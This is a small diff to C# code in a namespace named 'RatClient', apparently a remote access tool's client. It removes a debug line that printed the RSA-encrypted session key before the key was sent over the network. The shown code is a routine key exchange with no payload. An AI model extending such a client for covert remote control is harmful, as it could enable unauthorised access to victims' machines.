@@ -96,7 +96,6 @@ namespace RatClient
             byte[] iv = Acaes.randomIV(symKey);
             Acaes = new AESCyrpto(symKey, iv);
             byte[] msg = ACRSA.Encrypt(symKey, PublicKey);
-            Console.WriteLine(Encoding.UTF8.GetString(msg));
             client.GetStream().Write(msg, 0, msg.Length);
         }
 
